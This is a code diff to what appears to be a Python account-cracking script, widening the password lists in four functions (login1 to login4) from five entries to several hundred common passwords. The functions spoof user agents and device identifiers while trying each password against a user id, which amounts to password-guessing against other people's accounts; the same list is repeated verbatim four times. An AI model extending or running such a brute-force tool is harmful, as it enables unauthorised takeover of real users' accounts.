@@ -771,7 +771,114 @@ def login1(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456", "123456789", "password", "12345678", "111111",
+    "123123", "12345", "1234567", "1234567890", "000000",
+    "qwerty", "abc123", "password1", "1234", "iloveyou",
+    "1q2w3e4r", "123456a", "sunshine", "princess", "admin",
+    "welcome", "monkey", "123456789", "football", "123",
+    "12345678910", "1234567", "123qwe", "654321", "superman",
+    "1qaz2wsx", "qwertyuiop", "password123", "dragon", "baseball",
+    "letmein", "trustno1", "shadow", "master", "hello",
+    "freedom", "whatever", "qazwsx", "mustang", "access",
+    "696969", "batman", "starwars", "passw0rd", "123321",
+    "123abc", "123qweasd", "123qwe", "12345a", "12345qwert",
+    "12345qwerty", "12345qaz", "12345qazwsx", "12345qazxsw",
+    "12345qwertyuiop", "12345asdf", "12345asdfgh", "12345zxcv",
+    "12345zxcvbn", "12345qwertyuiopasdfghjklzxcvbnm",
+    
+    # Common number patterns
+    "11111111", "222222", "333333", "444444", "555555",
+    "666666", "7777777", "88888888", "999999", "101010",
+    "121212", "131313", "141414", "151515", "161616",
+    "171717", "181818", "191919", "202020", "112233",
+    "223344", "334455", "445566", "556677", "667788",
+    "778899", "889900", "990011", "001122", "121314",
+    "123123123", "321321", "456456", "789789", "147258",
+    "258369", "369258", "159357", "357159", "753951",
+    
+    # Common word passwords
+    "letmein", "welcome", "login", "admin", "password",
+    "pass", "pass123", "passw0rd", "p@ssword", "p@ssw0rd",
+    "secret", "private", "mypassword", "mypass", "mysecret",
+    "mylove", "mylife", "myworld", "myspace", "myaccount",
+    "iloveyou", "love", "loveyou", "loveme", "lover",
+    "baby", "babylove", "babygirl", "babyboy", "sweet",
+    "sweetheart", "sweety", "angel", "angels", "dear",
+    "honey", "sunshine", "sunny", "rainbow", "butterfly",
+    "dragon", "football", "soccer", "baseball", "basketball",
+    "tennis", "volleyball", "swimming", "running", "gaming",
+    "games", "player", "winner", "champion", "master",
+    
+    # Keyboard patterns
+    "qwerty", "qwertyuiop", "asdfghjkl", "zxcvbnm", "1qaz2wsx",
+    "1q2w3e4r", "1q2w3e4r5t", "qazwsx", "qazxsw", "zaq12wsx",
+    "!qaz2wsx", "!qaz@wsx", "!qaz1qaz", "1qaz@wsx", "1qazxsw2",
+    "qwerty123", "qwerty1", "qwerty12", "qwerty1234", "qwertyui",
+    "asdf1234", "asdf123", "asdf12", "asdf1", "asdfgh",
+    "asdfghj", "asdfghjk", "asdfghjkl", "zxcv123", "zxcv1234",
+    "zxcvbn", "zxcvbnm", "zxcvbnm,", "mnbvcxz", "poiuyt",
+    "lkjhgfdsa", "poiuytrewq", "mnbvcxzlkjhgfdsa", "!@#$%^&*",
+    "!@#$%^", "!@#$%", "!@#$", "!@#", "!#$",
+    
+    # Month/year combinations
+    "january", "february", "march", "april", "may",
+    "june", "july", "august", "september", "october",
+    "november", "december", "spring", "summer", "autumn",
+    "winter", "january1", "february2", "march3", "april4",
+    "may5", "june6", "july7", "august8", "september9",
+    "october10", "november11", "december12", "2020", "2021",
+    "2022", "2023", "2024", "2025", "2019",
+    "2018", "2017", "2016", "2015", "2014",
+    "2013", "2012", "2011", "2010", "2009",
+    "2008", "2007", "2006", "2005", "2004",
+    
+    # Common names
+    "michael", "jennifer", "joshua", "jason", "david",
+    "daniel", "robert", "john", "jose", "mary",
+    "maria", "linda", "susan", "patricia", "jessica",
+    "sarah", "karen", "nancy", "lisa", "betty",
+    "dorothy", "sandra", "ashley", "kimberly", "donna",
+    "emily", "michelle", "carol", "amanda", "melissa",
+    "deborah", "stephanie", "rebecca", "laura", "sharon",
+    "cynthia", "kathleen", "amy", "angela", "shirley",
+    "anna", "brenda", "pamela", "nicole", "ruth",
+    "katherine", "samantha", "christine", "helen", "debra",
+    
+    # Add more patterns as needed...
+    
+    # City/Country names
+    "london", "paris", "newyork", "tokyo", "berlin",
+    "moscow", "beijing", "seoul", "delhi", "mumbai",
+    "dubai", "istanbul", "singapore", "sydney", "melbourne",
+    "toronto", "vancouver", "chicago", "losangeles", "sanfrancisco",
+    "boston", "washington", "philadelphia", "dallas", "houston",
+    "miami", "atlanta", "detroit", "phoenix", "seattle",
+    
+    # Sports teams
+    "lakers", "warriors", "bulls", "celtics", "heat",
+    "knicks", "nets", "raptors", "rockets", "spurs",
+    "mavericks", "thunder", "jazz", "nuggets", "trailblazers",
+    "clippers", "suns", "kings", "pelicans", "grizzlies",
+    "timberwolves", "hornets", "pistons", "magic", "hawks",
+    "wizards", "pacers", "bucks", "cavaliers", "sixers",
+    
+    # Add more categories as needed...
+    
+    # Extended number sequences
+    "12345678910", "123456789101112", "12345678910111213",
+    "987654321", "87654321", "7654321", "654321", "54321",
+    "4321", "321", "21", "1234abcd", "abcd1234", "a1b2c3d4",
+    "1a2b3c4d", "aa11bb22", "11aa22bb", "1122aabb", "aabb1122",
+    
+    # Special character passwords
+    "p@ssword", "p@ssw0rd", "p@55w0rd", "p@$$w0rd", "p@$$word",
+    "s3cr3t", "s3cur3", "5ecur3", "5ecret", "t0ps3cr3t",
+    "adm1n", "@dm1n", "r00t", "l0gin", "w3lc0me",
+    "h3ll0", "w0rld", "d@rk", "l1ght", "n1ght",
+    "d@y", "m0rn1ng", "3v3n1ng", "m1dn1ght", "sunr1s3",
+    "sun$h1n3", "r@1nb0w", "cl0ud", "st@r", "m00n",
+    "c@t", "d0g", "b1rd", "f1sh", "h0rs3",
+    ]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -830,7 +937,114 @@ def login2(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456", "123456789", "password", "12345678", "111111",
+    "123123", "12345", "1234567", "1234567890", "000000",
+    "qwerty", "abc123", "password1", "1234", "iloveyou",
+    "1q2w3e4r", "123456a", "sunshine", "princess", "admin",
+    "welcome", "monkey", "123456789", "football", "123",
+    "12345678910", "1234567", "123qwe", "654321", "superman",
+    "1qaz2wsx", "qwertyuiop", "password123", "dragon", "baseball",
+    "letmein", "trustno1", "shadow", "master", "hello",
+    "freedom", "whatever", "qazwsx", "mustang", "access",
+    "696969", "batman", "starwars", "passw0rd", "123321",
+    "123abc", "123qweasd", "123qwe", "12345a", "12345qwert",
+    "12345qwerty", "12345qaz", "12345qazwsx", "12345qazxsw",
+    "12345qwertyuiop", "12345asdf", "12345asdfgh", "12345zxcv",
+    "12345zxcvbn", "12345qwertyuiopasdfghjklzxcvbnm",
+    
+    # Common number patterns
+    "11111111", "222222", "333333", "444444", "555555",
+    "666666", "7777777", "88888888", "999999", "101010",
+    "121212", "131313", "141414", "151515", "161616",
+    "171717", "181818", "191919", "202020", "112233",
+    "223344", "334455", "445566", "556677", "667788",
+    "778899", "889900", "990011", "001122", "121314",
+    "123123123", "321321", "456456", "789789", "147258",
+    "258369", "369258", "159357", "357159", "753951",
+    
+    # Common word passwords
+    "letmein", "welcome", "login", "admin", "password",
+    "pass", "pass123", "passw0rd", "p@ssword", "p@ssw0rd",
+    "secret", "private", "mypassword", "mypass", "mysecret",
+    "mylove", "mylife", "myworld", "myspace", "myaccount",
+    "iloveyou", "love", "loveyou", "loveme", "lover",
+    "baby", "babylove", "babygirl", "babyboy", "sweet",
+    "sweetheart", "sweety", "angel", "angels", "dear",
+    "honey", "sunshine", "sunny", "rainbow", "butterfly",
+    "dragon", "football", "soccer", "baseball", "basketball",
+    "tennis", "volleyball", "swimming", "running", "gaming",
+    "games", "player", "winner", "champion", "master",
+    
+    # Keyboard patterns
+    "qwerty", "qwertyuiop", "asdfghjkl", "zxcvbnm", "1qaz2wsx",
+    "1q2w3e4r", "1q2w3e4r5t", "qazwsx", "qazxsw", "zaq12wsx",
+    "!qaz2wsx", "!qaz@wsx", "!qaz1qaz", "1qaz@wsx", "1qazxsw2",
+    "qwerty123", "qwerty1", "qwerty12", "qwerty1234", "qwertyui",
+    "asdf1234", "asdf123", "asdf12", "asdf1", "asdfgh",
+    "asdfghj", "asdfghjk", "asdfghjkl", "zxcv123", "zxcv1234",
+    "zxcvbn", "zxcvbnm", "zxcvbnm,", "mnbvcxz", "poiuyt",
+    "lkjhgfdsa", "poiuytrewq", "mnbvcxzlkjhgfdsa", "!@#$%^&*",
+    "!@#$%^", "!@#$%", "!@#$", "!@#", "!#$",
+    
+    # Month/year combinations
+    "january", "february", "march", "april", "may",
+    "june", "july", "august", "september", "october",
+    "november", "december", "spring", "summer", "autumn",
+    "winter", "january1", "february2", "march3", "april4",
+    "may5", "june6", "july7", "august8", "september9",
+    "october10", "november11", "december12", "2020", "2021",
+    "2022", "2023", "2024", "2025", "2019",
+    "2018", "2017", "2016", "2015", "2014",
+    "2013", "2012", "2011", "2010", "2009",
+    "2008", "2007", "2006", "2005", "2004",
+    
+    # Common names
+    "michael", "jennifer", "joshua", "jason", "david",
+    "daniel", "robert", "john", "jose", "mary",
+    "maria", "linda", "susan", "patricia", "jessica",
+    "sarah", "karen", "nancy", "lisa", "betty",
+    "dorothy", "sandra", "ashley", "kimberly", "donna",
+    "emily", "michelle", "carol", "amanda", "melissa",
+    "deborah", "stephanie", "rebecca", "laura", "sharon",
+    "cynthia", "kathleen", "amy", "angela", "shirley",
+    "anna", "brenda", "pamela", "nicole", "ruth",
+    "katherine", "samantha", "christine", "helen", "debra",
+    
+    # Add more patterns as needed...
+    
+    # City/Country names
+    "london", "paris", "newyork", "tokyo", "berlin",
+    "moscow", "beijing", "seoul", "delhi", "mumbai",
+    "dubai", "istanbul", "singapore", "sydney", "melbourne",
+    "toronto", "vancouver", "chicago", "losangeles", "sanfrancisco",
+    "boston", "washington", "philadelphia", "dallas", "houston",
+    "miami", "atlanta", "detroit", "phoenix", "seattle",
+    
+    # Sports teams
+    "lakers", "warriors", "bulls", "celtics", "heat",
+    "knicks", "nets", "raptors", "rockets", "spurs",
+    "mavericks", "thunder", "jazz", "nuggets", "trailblazers",
+    "clippers", "suns", "kings", "pelicans", "grizzlies",
+    "timberwolves", "hornets", "pistons", "magic", "hawks",
+    "wizards", "pacers", "bucks", "cavaliers", "sixers",
+    
+    # Add more categories as needed...
+    
+    # Extended number sequences
+    "12345678910", "123456789101112", "12345678910111213",
+    "987654321", "87654321", "7654321", "654321", "54321",
+    "4321", "321", "21", "1234abcd", "abcd1234", "a1b2c3d4",
+    "1a2b3c4d", "aa11bb22", "11aa22bb", "1122aabb", "aabb1122",
+    
+    # Special character passwords
+    "p@ssword", "p@ssw0rd", "p@55w0rd", "p@$$w0rd", "p@$$word",
+    "s3cr3t", "s3cur3", "5ecur3", "5ecret", "t0ps3cr3t",
+    "adm1n", "@dm1n", "r00t", "l0gin", "w3lc0me",
+    "h3ll0", "w0rld", "d@rk", "l1ght", "n1ght",
+    "d@y", "m0rn1ng", "3v3n1ng", "m1dn1ght", "sunr1s3",
+    "sun$h1n3", "r@1nb0w", "cl0ud", "st@r", "m00n",
+    "c@t", "d0g", "b1rd", "f1sh", "h0rs3",
+    ]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -891,7 +1105,114 @@ def login3(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456", "123456789", "password", "12345678", "111111",
+    "123123", "12345", "1234567", "1234567890", "000000",
+    "qwerty", "abc123", "password1", "1234", "iloveyou",
+    "1q2w3e4r", "123456a", "sunshine", "princess", "admin",
+    "welcome", "monkey", "123456789", "football", "123",
+    "12345678910", "1234567", "123qwe", "654321", "superman",
+    "1qaz2wsx", "qwertyuiop", "password123", "dragon", "baseball",
+    "letmein", "trustno1", "shadow", "master", "hello",
+    "freedom", "whatever", "qazwsx", "mustang", "access",
+    "696969", "batman", "starwars", "passw0rd", "123321",
+    "123abc", "123qweasd", "123qwe", "12345a", "12345qwert",
+    "12345qwerty", "12345qaz", "12345qazwsx", "12345qazxsw",
+    "12345qwertyuiop", "12345asdf", "12345asdfgh", "12345zxcv",
+    "12345zxcvbn", "12345qwertyuiopasdfghjklzxcvbnm",
+    
+    # Common number patterns
+    "11111111", "222222", "333333", "444444", "555555",
+    "666666", "7777777", "88888888", "999999", "101010",
+    "121212", "131313", "141414", "151515", "161616",
+    "171717", "181818", "191919", "202020", "112233",
+    "223344", "334455", "445566", "556677", "667788",
+    "778899", "889900", "990011", "001122", "121314",
+    "123123123", "321321", "456456", "789789", "147258",
+    "258369", "369258", "159357", "357159", "753951",
+    
+    # Common word passwords
+    "letmein", "welcome", "login", "admin", "password",
+    "pass", "pass123", "passw0rd", "p@ssword", "p@ssw0rd",
+    "secret", "private", "mypassword", "mypass", "mysecret",
+    "mylove", "mylife", "myworld", "myspace", "myaccount",
+    "iloveyou", "love", "loveyou", "loveme", "lover",
+    "baby", "babylove", "babygirl", "babyboy", "sweet",
+    "sweetheart", "sweety", "angel", "angels", "dear",
+    "honey", "sunshine", "sunny", "rainbow", "butterfly",
+    "dragon", "football", "soccer", "baseball", "basketball",
+    "tennis", "volleyball", "swimming", "running", "gaming",
+    "games", "player", "winner", "champion", "master",
+    
+    # Keyboard patterns
+    "qwerty", "qwertyuiop", "asdfghjkl", "zxcvbnm", "1qaz2wsx",
+    "1q2w3e4r", "1q2w3e4r5t", "qazwsx", "qazxsw", "zaq12wsx",
+    "!qaz2wsx", "!qaz@wsx", "!qaz1qaz", "1qaz@wsx", "1qazxsw2",
+    "qwerty123", "qwerty1", "qwerty12", "qwerty1234", "qwertyui",
+    "asdf1234", "asdf123", "asdf12", "asdf1", "asdfgh",
+    "asdfghj", "asdfghjk", "asdfghjkl", "zxcv123", "zxcv1234",
+    "zxcvbn", "zxcvbnm", "zxcvbnm,", "mnbvcxz", "poiuyt",
+    "lkjhgfdsa", "poiuytrewq", "mnbvcxzlkjhgfdsa", "!@#$%^&*",
+    "!@#$%^", "!@#$%", "!@#$", "!@#", "!#$",
+    
+    # Month/year combinations
+    "january", "february", "march", "april", "may",
+    "june", "july", "august", "september", "october",
+    "november", "december", "spring", "summer", "autumn",
+    "winter", "january1", "february2", "march3", "april4",
+    "may5", "june6", "july7", "august8", "september9",
+    "october10", "november11", "december12", "2020", "2021",
+    "2022", "2023", "2024", "2025", "2019",
+    "2018", "2017", "2016", "2015", "2014",
+    "2013", "2012", "2011", "2010", "2009",
+    "2008", "2007", "2006", "2005", "2004",
+    
+    # Common names
+    "michael", "jennifer", "joshua", "jason", "david",
+    "daniel", "robert", "john", "jose", "mary",
+    "maria", "linda", "susan", "patricia", "jessica",
+    "sarah", "karen", "nancy", "lisa", "betty",
+    "dorothy", "sandra", "ashley", "kimberly", "donna",
+    "emily", "michelle", "carol", "amanda", "melissa",
+    "deborah", "stephanie", "rebecca", "laura", "sharon",
+    "cynthia", "kathleen", "amy", "angela", "shirley",
+    "anna", "brenda", "pamela", "nicole", "ruth",
+    "katherine", "samantha", "christine", "helen", "debra",
+    
+    # Add more patterns as needed...
+    
+    # City/Country names
+    "london", "paris", "newyork", "tokyo", "berlin",
+    "moscow", "beijing", "seoul", "delhi", "mumbai",
+    "dubai", "istanbul", "singapore", "sydney", "melbourne",
+    "toronto", "vancouver", "chicago", "losangeles", "sanfrancisco",
+    "boston", "washington", "philadelphia", "dallas", "houston",
+    "miami", "atlanta", "detroit", "phoenix", "seattle",
+    
+    # Sports teams
+    "lakers", "warriors", "bulls", "celtics", "heat",
+    "knicks", "nets", "raptors", "rockets", "spurs",
+    "mavericks", "thunder", "jazz", "nuggets", "trailblazers",
+    "clippers", "suns", "kings", "pelicans", "grizzlies",
+    "timberwolves", "hornets", "pistons", "magic", "hawks",
+    "wizards", "pacers", "bucks", "cavaliers", "sixers",
+    
+    # Add more categories as needed...
+    
+    # Extended number sequences
+    "12345678910", "123456789101112", "12345678910111213",
+    "987654321", "87654321", "7654321", "654321", "54321",
+    "4321", "321", "21", "1234abcd", "abcd1234", "a1b2c3d4",
+    "1a2b3c4d", "aa11bb22", "11aa22bb", "1122aabb", "aabb1122",
+    
+    # Special character passwords
+    "p@ssword", "p@ssw0rd", "p@55w0rd", "p@$$w0rd", "p@$$word",
+    "s3cr3t", "s3cur3", "5ecur3", "5ecret", "t0ps3cr3t",
+    "adm1n", "@dm1n", "r00t", "l0gin", "w3lc0me",
+    "h3ll0", "w0rld", "d@rk", "l1ght", "n1ght",
+    "d@y", "m0rn1ng", "3v3n1ng", "m1dn1ght", "sunr1s3",
+    "sun$h1n3", "r@1nb0w", "cl0ud", "st@r", "m00n",
+    "c@t", "d0g", "b1rd", "f1sh", "h0rs3",
+    ]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -952,7 +1273,114 @@ def login4(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456", "123456789", "password", "12345678", "111111",
+    "123123", "12345", "1234567", "1234567890", "000000",
+    "qwerty", "abc123", "password1", "1234", "iloveyou",
+    "1q2w3e4r", "123456a", "sunshine", "princess", "admin",
+    "welcome", "monkey", "123456789", "football", "123",
+    "12345678910", "1234567", "123qwe", "654321", "superman",
+    "1qaz2wsx", "qwertyuiop", "password123", "dragon", "baseball",
+    "letmein", "trustno1", "shadow", "master", "hello",
+    "freedom", "whatever", "qazwsx", "mustang", "access",
+    "696969", "batman", "starwars", "passw0rd", "123321",
+    "123abc", "123qweasd", "123qwe", "12345a", "12345qwert",
+    "12345qwerty", "12345qaz", "12345qazwsx", "12345qazxsw",
+    "12345qwertyuiop", "12345asdf", "12345asdfgh", "12345zxcv",
+    "12345zxcvbn", "12345qwertyuiopasdfghjklzxcvbnm",
+    
+    # Common number patterns
+    "11111111", "222222", "333333", "444444", "555555",
+    "666666", "7777777", "88888888", "999999", "101010",
+    "121212", "131313", "141414", "151515", "161616",
+    "171717", "181818", "191919", "202020", "112233",
+    "223344", "334455", "445566", "556677", "667788",
+    "778899", "889900", "990011", "001122", "121314",
+    "123123123", "321321", "456456", "789789", "147258",
+    "258369", "369258", "159357", "357159", "753951",
+    
+    # Common word passwords
+    "letmein", "welcome", "login", "admin", "password",
+    "pass", "pass123", "passw0rd", "p@ssword", "p@ssw0rd",
+    "secret", "private", "mypassword", "mypass", "mysecret",
+    "mylove", "mylife", "myworld", "myspace", "myaccount",
+    "iloveyou", "love", "loveyou", "loveme", "lover",
+    "baby", "babylove", "babygirl", "babyboy", "sweet",
+    "sweetheart", "sweety", "angel", "angels", "dear",
+    "honey", "sunshine", "sunny", "rainbow", "butterfly",
+    "dragon", "football", "soccer", "baseball", "basketball",
+    "tennis", "volleyball", "swimming", "running", "gaming",
+    "games", "player", "winner", "champion", "master",
+    
+    # Keyboard patterns
+    "qwerty", "qwertyuiop", "asdfghjkl", "zxcvbnm", "1qaz2wsx",
+    "1q2w3e4r", "1q2w3e4r5t", "qazwsx", "qazxsw", "zaq12wsx",
+    "!qaz2wsx", "!qaz@wsx", "!qaz1qaz", "1qaz@wsx", "1qazxsw2",
+    "qwerty123", "qwerty1", "qwerty12", "qwerty1234", "qwertyui",
+    "asdf1234", "asdf123", "asdf12", "asdf1", "asdfgh",
+    "asdfghj", "asdfghjk", "asdfghjkl", "zxcv123", "zxcv1234",
+    "zxcvbn", "zxcvbnm", "zxcvbnm,", "mnbvcxz", "poiuyt",
+    "lkjhgfdsa", "poiuytrewq", "mnbvcxzlkjhgfdsa", "!@#$%^&*",
+    "!@#$%^", "!@#$%", "!@#$", "!@#", "!#$",
+    
+    # Month/year combinations
+    "january", "february", "march", "april", "may",
+    "june", "july", "august", "september", "october",
+    "november", "december", "spring", "summer", "autumn",
+    "winter", "january1", "february2", "march3", "april4",
+    "may5", "june6", "july7", "august8", "september9",
+    "october10", "november11", "december12", "2020", "2021",
+    "2022", "2023", "2024", "2025", "2019",
+    "2018", "2017", "2016", "2015", "2014",
+    "2013", "2012", "2011", "2010", "2009",
+    "2008", "2007", "2006", "2005", "2004",
+    
+    # Common names
+    "michael", "jennifer", "joshua", "jason", "david",
+    "daniel", "robert", "john", "jose", "mary",
+    "maria", "linda", "susan", "patricia", "jessica",
+    "sarah", "karen", "nancy", "lisa", "betty",
+    "dorothy", "sandra", "ashley", "kimberly", "donna",
+    "emily", "michelle", "carol", "amanda", "melissa",
+    "deborah", "stephanie", "rebecca", "laura", "sharon",
+    "cynthia", "kathleen", "amy", "angela", "shirley",
+    "anna", "brenda", "pamela", "nicole", "ruth",
+    "katherine", "samantha", "christine", "helen", "debra",
+    
+    # Add more patterns as needed...
+    
+    # City/Country names
+    "london", "paris", "newyork", "tokyo", "berlin",
+    "moscow", "beijing", "seoul", "delhi", "mumbai",
+    "dubai", "istanbul", "singapore", "sydney", "melbourne",
+    "toronto", "vancouver", "chicago", "losangeles", "sanfrancisco",
+    "boston", "washington", "philadelphia", "dallas", "houston",
+    "miami", "atlanta", "detroit", "phoenix", "seattle",
+    
+    # Sports teams
+    "lakers", "warriors", "bulls", "celtics", "heat",
+    "knicks", "nets", "raptors", "rockets", "spurs",
+    "mavericks", "thunder", "jazz", "nuggets", "trailblazers",
+    "clippers", "suns", "kings", "pelicans", "grizzlies",
+    "timberwolves", "hornets", "pistons", "magic", "hawks",
+    "wizards", "pacers", "bucks", "cavaliers", "sixers",
+    
+    # Add more categories as needed...
+    
+    # Extended number sequences
+    "12345678910", "123456789101112", "12345678910111213",
+    "987654321", "87654321", "7654321", "654321", "54321",
+    "4321", "321", "21", "1234abcd", "abcd1234", "a1b2c3d4",
+    "1a2b3c4d", "aa11bb22", "11aa22bb", "1122aabb", "aabb1122",
+    
+    # Special character passwords
+    "p@ssword", "p@ssw0rd", "p@55w0rd", "p@$$w0rd", "p@$$word",
+    "s3cr3t", "s3cur3", "5ecur3", "5ecret", "t0ps3cr3t",
+    "adm1n", "@dm1n", "r00t", "l0gin", "w3lc0me",
+    "h3ll0", "w0rld", "d@rk", "l1ght", "n1ght",
+    "d@y", "m0rn1ng", "3v3n1ng", "m1dn1ght", "sunr1s3",
+    "sun$h1n3", "r@1nb0w", "cl0ud", "st@r", "m00n",
+    "c@t", "d0g", "b1rd", "f1sh", "h0rs3",
+    ]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
